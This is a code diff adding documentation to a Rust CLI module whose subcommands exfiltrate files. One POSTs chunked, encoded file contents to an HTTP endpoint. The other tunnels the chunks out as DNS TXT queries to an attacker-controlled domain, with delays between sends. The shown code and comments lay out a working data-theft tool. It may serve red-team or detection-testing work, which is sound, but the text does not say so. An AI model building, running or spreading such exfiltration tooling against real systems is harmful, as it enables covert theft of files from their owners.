@@ -1,9 +1,32 @@
-/// TODO: Add shuffle option to randomize chunk order
+/*!
+Exfiltration subcommands for the runner CLI.
+
+This module contains concrete command implementations for exfiltrating files
+over different protocols. Two primary approaches are provided:
+
+- HTTP: post encoded chunks to an HTTP endpoint.
+- DNS: send encoded chunks as DNS queries (TXT-style labels), taking care to
+  split payloads into DNS-label-safe chunks.
+
+Each command type implements `CommandHandler` and performs its work when
+`handle()` is invoked by the top-level CLI dispatch.
+*/
+
 use clap::{Args, Subcommand, ValueEnum};
 use std::path::PathBuf;
 
 use crate::CommandHandler;
 
+/// HTTP-based exfiltration subcommand arguments.
+///
+/// - `files_path`: list of source files to exfiltrate (comma-separated on CLI).
+/// - `url`: destination HTTP endpoint to POST encoded chunks to.
+/// - `delay`: delay between sending chunks (milliseconds).
+/// - `chunks`: how many logical chunks each file should be split into.
+///
+/// The command reads each file, splits it into `chunks` parts, encodes each
+/// part using the project's canonical base64->hex encoding and sends each
+/// encoded chunk as the text/plain body of an HTTP POST request to `url`.
 #[derive(Debug, Clone, Args)]
 #[command(name = "http")]
 pub struct HTTPExfiltrationSubCommand {
@@ -35,6 +58,17 @@ pub struct HTTPExfiltrationSubCommand {
 }
 
 impl CommandHandler for HTTPExfiltrationSubCommand {
+    /// Execute the HTTP exfiltration flow.
+    ///
+    /// For each provided `files_path`:
+    /// 1. Read the file.
+    /// 2. Split it into `chunks` logical parts and encode each part.
+    /// 3. POST each encoded chunk to the configured `url` with Content-Type `text/plain`.
+    /// 4. Sleep for `delay` milliseconds between requests.
+    ///
+    /// This implementation uses blocking reqwest client calls and will panic on
+    /// any send/read error via `unwrap()`; callers may wrap or adapt for
+    /// production usage.
     fn handle(self) {
         self.files_path.iter().for_each(|file_path| {
             println!("[*] Reading file {}", file_path.to_string_lossy());
@@ -55,6 +89,11 @@ impl CommandHandler for HTTPExfiltrationSubCommand {
     }
 }
 
+/// DNS transport protocol choices for DNS exfiltration.
+///
+/// The enum is exposed as a CLI `ValueEnum` to allow specifying `--protocol` on
+/// the command line. The inner conversion maps to the `hickory_resolver` crate's
+/// protocol type used when building the resolver configuration.
 #[derive(ValueEnum, Copy, Clone, Debug, PartialEq, Eq)]
 enum DNSProtocol {
     TCP,
@@ -62,6 +101,8 @@ enum DNSProtocol {
 }
 
 impl From<DNSProtocol> for hickory_resolver::proto::xfer::Protocol {
+    /// Convert the CLI `DNSProtocol` value into the resolver crate's protocol
+    /// enumeration.
     fn from(value: DNSProtocol) -> Self {
         match value {
             DNSProtocol::TCP => hickory_resolver::proto::xfer::Protocol::Tcp,
@@ -70,6 +111,20 @@ impl From<DNSProtocol> for hickory_resolver::proto::xfer::Protocol {
     }
 }
 
+/// DNS-based exfiltration subcommand arguments.
+///
+/// - `file_path`: the single file to exfiltrate.
+/// - `destination`: the destination domain (used as the target domain of queries).
+/// - `delay`: delay between sending chunks (milliseconds).
+/// - `proto`: whether to use UDP or TCP for DNS transport.
+/// - `nameserver`: optional upstream nameserver to target (e.g. `1.2.3.4:53`).
+///
+/// This command:
+/// 1. Reads the file and produces DNS-safe encoded chunks using the encoder utilities.
+/// 2. Optionally configures a custom resolver that points to `nameserver`.
+/// 3. For each encoded chunk, issues a TXT lookup (via `resolver.txt_lookup`) for
+///    a name constructed by prefixing the chunk to the destination domain.
+/// 4. Sleeps `delay` milliseconds between queries.
 #[derive(Debug, Clone, Args)]
 #[command(name = "dns")]
 pub struct DNSExfiltrationSubCommand {
@@ -96,6 +151,16 @@ pub struct DNSExfiltrationSubCommand {
 }
 
 impl CommandHandler for DNSExfiltrationSubCommand {
+    /// Execute the DNS exfiltration flow.
+    ///
+    /// Notes:
+    /// - The resolver uses the `hickory_resolver` crate and will build an
+    ///   async resolver instance. A temporary Tokio runtime is created for the
+    ///   lifetime of the operation to perform the lookups synchronously via
+    ///   `block_on`.
+    /// - Each encoded chunk is emitted as a TXT lookup for `<chunk>.<destination>.`
+    ///   to the configured resolver; this allows an authoritative server for
+    ///   `destination` to receive the payload via the query name.
     fn handle(self) {
         println!("[*] Reading file {}", self.file_path.to_string_lossy());
         println!("[*] Encoding payload.");
@@ -133,6 +198,10 @@ impl CommandHandler for DNSExfiltrationSubCommand {
     }
 }
 
+/// Wrapper struct for the `exfil` subcommand family.
+///
+/// This struct delegates to a chosen `ExfiltrationType` subcommand (HTTP or DNS)
+/// parsed via `clap`. It implements `CommandHandler` to perform the dispatch.
 #[derive(Debug, Args)]
 pub struct ExfiltrationSubCommandArgs {
     #[command(subcommand)]
@@ -140,6 +209,7 @@ pub struct ExfiltrationSubCommandArgs {
 }
 
 impl CommandHandler for ExfiltrationSubCommandArgs {
+    /// Execute the selected exfiltration variant.
     fn handle(self) {
         match self.exfil_type {
             ExfiltrationType::HTTP(exfil_http_subcmd) => exfil_http_subcmd.handle(),
@@ -148,6 +218,9 @@ impl CommandHandler for ExfiltrationSubCommandArgs {
     }
 }
 
+/// Supported exfiltration transport types.
+///
+/// Each enum variant wraps the concrete argument struct for that transport.
 #[derive(Debug, Subcommand)]
 pub enum ExfiltrationType {
     HTTP(HTTPExfiltrationSubCommand),
